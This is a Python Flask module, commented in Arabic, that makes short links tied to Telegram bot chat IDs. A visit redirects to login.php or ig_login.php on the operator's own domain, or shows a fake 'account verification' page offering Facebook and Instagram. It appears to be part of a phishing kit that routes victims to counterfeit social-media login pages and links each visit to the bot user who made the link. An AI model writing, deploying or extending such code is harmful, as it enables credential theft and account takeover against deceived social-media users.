# short_link.py
# ============================================================
# المسار القصير /f/<code> — يوجه لـ Facebook أو Instagram
# v2 — بعد حذف Session Hunter
# ============================================================

import json
import time
import uuid
from flask import request, redirect, render_template_string

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("short_link")


# ============================================================
# صفحة اختيار الموقع (لو المستخدم مختارش)
# ============================================================
CHOOSE_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جاري التحقق...</title>
<style>
  body {
    background: #0b1120;
    color: #e2e8f0;
    font-family: system-ui, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
  }
  .box {
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 16px;
    padding: 32px 24px;
    max-width: 380px;
    text-align: center;
  }
  .icon { font-size: 48px; margin-bottom: 16px; }
  h1 { font-size: 20px; margin: 0 0 12px; color: #f1f5f9; }
  p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin: 0 0 24px; }
  .btn {
    display: block;
    padding: 14px 20px;
    margin-bottom: 10px;
    border-radius: 12px;
    text-decoration: none;
    font-weight: 600;
    font-size: 15px;
    color: white;
    transition: transform 0.2s;
  }
  .btn:hover { transform: translateY(-2px); }
  .fb { background: linear-gradient(135deg, #1877f2, #4267B2); }
  .ig { background: linear-gradient(135deg, #E4405F, #833AB4); }
</style>
</head>
<body>
<div class="box">
  <div class="icon">🔐</div>
  <h1>التحقق من الحساب</h1>
  <p>يرجى اختيار المنصة للتحقق</p>

  <a href="__FB_URL__" class="btn fb">📘 Facebook</a>
  <a href="__IG_URL__" class="btn ig">📸 Instagram</a>
</div>
</body>
</html>
"""


# ============================================================
# Error Page
# ============================================================
ERROR_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>رابط منتهي</title>
<style>
  body {
    background: #0b1120;
    color: #e2e8f0;
    font-family: system-ui, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    text-align: center;
  }
  .box {
    max-width: 340px;
    padding: 40px 24px;
  }
  .icon { font-size: 64px; margin-bottom: 20px; }
  h1 { color: #ef4444; font-size: 22px; margin: 0 0 12px; }
  p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
</style>
</head>
<body>
<div class="box">
  <div class="icon">❌</div>
  <h1>الرابط منتهي</h1>
  <p>هذا الرابط لم يعد صالحاً للاستخدام<br>يرجى طلب رابط جديد</p>
</div>
</body>
</html>
"""


# ============================================================
# Redis Key
# ============================================================
def _short_key(code):
    return f"short:{code}"


# ============================================================
# الحصول على بيانات الرابط القصير
# ============================================================
def get_short_link(code):
    """يرجع بيانات الرابط القصير من Redis"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get(_short_key(code))
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"get_short_link error: {e}")
    return None


# ============================================================
# إنشاء رابط قصير جديد
# ============================================================
def create_short_link(chat_id, site="auto"):
    """
    ينشئ رابط قصير جديد
    site: "facebook" | "instagram" | "auto"
    """
    if not redis_client:
        return None

    try:
        code = uuid.uuid4().hex[:8]

        meta = {
            "chat_id": str(chat_id),
            "site": site,
            "created_at": time.time(),
        }

        redis_client.setex(
            _short_key(code),
            86400 * 30,  # 30 يوم
            json.dumps(meta)
        )

        full_url = f"{PUBLIC_URL}/f/{code}"
        logger.info(f"Short link created: {code} → {chat_id} ({site})")
        metrics.inc_counter("short_links_created")

        return full_url

    except Exception as e:
        logger.exception(f"create_short_link error: {e}")
        return None


# ============================================================
# Routes
# ============================================================
def init_short_link(app):
    """تسجيل مسار الرابط القصير"""

    @app.route('/f/<code>', methods=['GET'])
    def short_link_show(code):
        """يعرض الصفحة المناسبة حسب نوع الرابط"""
        meta = get_short_link(code)

        if not meta:
            metrics.inc_counter("short_link_invalid")
            return ERROR_PAGE, 410

        chat_id = str(meta.get("chat_id"))
        site = meta.get("site", "auto")

        # ----------------------------------------
        # بناء الروابط الأساسية
        # ----------------------------------------
        fb_url = f"{PUBLIC_URL}/login.php?id={chat_id}"
        ig_url = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"

        logger.info(f"Short link accessed: {code} → chat={chat_id} site={site}")
        metrics.inc_counter("short_link_accessed", tags={"site": site})

        # ----------------------------------------
        # لو محدد موقع → Redirect مباشر
        # ----------------------------------------
        if site == "facebook":
            return redirect(fb_url, code=302)

        if site == "instagram":
            return redirect(ig_url, code=302)

        # ----------------------------------------
        # لو auto → صفحة اختيار
        # ----------------------------------------
        html = (CHOOSE_PAGE
                .replace("__FB_URL__", fb_url)
                .replace("__IG_URL__", ig_url))

        return html, 200


    logger.info("[+] short_link routes registered: /f/<code>")
